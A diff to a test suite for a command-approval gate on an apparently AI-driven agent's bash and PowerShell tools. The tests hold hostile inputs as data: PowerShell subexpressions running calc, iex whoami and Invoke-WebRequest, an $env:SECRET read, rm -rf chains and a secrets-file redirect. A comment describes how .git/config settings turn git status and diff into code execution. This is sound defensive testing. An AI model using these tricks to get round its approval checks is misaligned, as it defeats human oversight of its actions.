@@ -55,7 +55,7 @@ describe("approvals extension", () => {
 
 	it("runs read-only commands from the default allow list without asking", async () => {
 		const { asked, call } = setup([]);
-		expect(await call("git status")).toBeUndefined();
+		expect(await call("git rev-parse --show-toplevel")).toBeUndefined();
 		expect(await call("rg rateLimit src/")).toBeUndefined();
 		expect(asked).toEqual([]);
 	});
@@ -82,6 +82,15 @@ describe("approvals extension", () => {
 			"git diff --ext",
 			"git -c core.pager=sh log",
 			"git --exec-path=/tmp status",
+			// git status runs core.fsmonitor; git diff, log -p and show run diff.external or a textconv
+			// program. The write tool can set those in .git/config without asking, so they ask.
+			"git status",
+			"git status --short",
+			"git diff",
+			"git diff --stat HEAD~1",
+			"git log -p",
+			"git log --oneline -5",
+			"git show HEAD",
 			// git branch only lists: no delete, move, force or creating a branch.
 			"git branch -D main",
 			"git branch -d main",
@@ -126,11 +135,6 @@ describe("approvals extension", () => {
 			"cat package.json",
 			"rg -n rateLimit src/ --type ts",
 			"rg --no-ignore -tts rateLimit",
-			"git status --short",
-			"git diff --stat HEAD~1",
-			"git diff --no-ext-diff",
-			"git log --oneline -5",
-			"git show HEAD:package.json",
 			"git branch",
 			"git branch -a",
 			"git branch -vv",
@@ -146,18 +150,28 @@ describe("approvals extension", () => {
 		expect(asked).toEqual([]);
 	});
 
-	it("records each decision in the session, not the built-in read-only commands", async () => {
+	it("records each decision in the session, built-in read-only commands included", async () => {
 		const { call, records } = setup(
 			[{ decision: "allow_once" }, { decision: "allow_always" }, { decision: "deny", message: "use make test" }],
 			{ approvals: { allow: ["npm test"] } },
 		);
-		await call("git status");
+		await call("ls src");
 		await call("make build");
 		await call("pnpm vitest run a.test.ts");
 		await call("pnpm vitest run b.test.ts");
 		await call("npm test -- --watch=false");
 		await call("make deploy");
 		expect(records.map(({ customType, data }) => ({ customType, ...data }))).toEqual([
+			{
+				customType: "approval",
+				sessionId: "session-1",
+				toolCallId: "t1",
+				tool: "bash",
+				command: "ls src",
+				pattern: "ls src",
+				decision: "allowed_by_rule",
+				rule: "built_in",
+			},
 			{
 				customType: "approval",
 				sessionId: "session-1",
@@ -238,9 +252,48 @@ describe("approvals extension", () => {
 		});
 	});
 
+	it("never uses the built-in list for PowerShell, whose (…) arguments run commands", async () => {
+		const commands = [
+			"echo (Start-Process calc)",
+			"cat (iex 'whoami')",
+			"ls -Path (Invoke-WebRequest http://x -OutFile p)",
+			"ls",
+			"cat README.md",
+			"git rev-parse --show-toplevel",
+		];
+		const { asked, call } = setup(commands.map(() => ({ decision: "deny" }) as const));
+		for (const command of commands) {
+			expect(await call(command, "tui", "powershell")).toMatchObject({ block: true });
+		}
+		expect(asked).toHaveLength(commands.length);
+	});
+
+	it("asks for PowerShell subexpressions, variables, splats and script blocks even with an allowed prefix", async () => {
+		const tricks = [
+			"npm test (Start-Process calc)",
+			"npm test $(iex whoami)",
+			"npm test $env:SECRET",
+			"npm test @(calc)",
+			"npm test @args",
+			"npm test {calc}",
+			"npm test [Diagnostics.Process]::Start('calc')",
+		];
+		const { asked, call, records } = setup(
+			tricks.map(() => ({ decision: "deny" }) as const),
+			{
+				approvals: { allow: ["npm test"] },
+			},
+		);
+		for (const command of tricks) await call(command, "tui", "powershell");
+		expect(asked).toHaveLength(tricks.length);
+		// A plain PowerShell command still matches the person's own allow pattern.
+		expect(await call("npm test -- --watch=false", "tui", "powershell")).toBeUndefined();
+		expect(records.at(-1)?.data).toMatchObject({ tool: "powershell", decision: "allowed_by_rule", rule: "settings" });
+	});
+
 	it("always asks for chained or redirected commands, even with an allowed prefix", async () => {
 		const { asked, call } = setup([{ decision: "allow_once" }, { decision: "allow_once" }]);
-		await call("git status && rm -rf build");
+		await call("git rev-parse HEAD && rm -rf build");
 		await call("cat secrets.txt > /tmp/out");
 		expect(asked).toHaveLength(2);
 	});
@@ -275,6 +328,10 @@ describe("command allow list", () => {
 		expect(commandMatchesPattern("ls", "lsof -i")).toBe(false);
 		expect(commandMatchesPattern("", "ls")).toBe(false);
 		expect(isCommandAllowed("echo $(rm -rf x)", ["echo"])).toBe(false);
+		expect(commandMatchesPattern("echo", "echo (calc)")).toBe(true);
+		expect(commandMatchesPattern("echo", "echo (calc)", "powershell")).toBe(false);
+		expect(isCommandAllowed("echo (calc)", ["echo"], "powershell")).toBe(false);
+		expect(isCommandAllowed("echo hi", ["echo"], "powershell")).toBe(true);
 		expect(commandAllowPattern("  pnpm   vitest run x ")).toBe("pnpm vitest");
 	});
 });
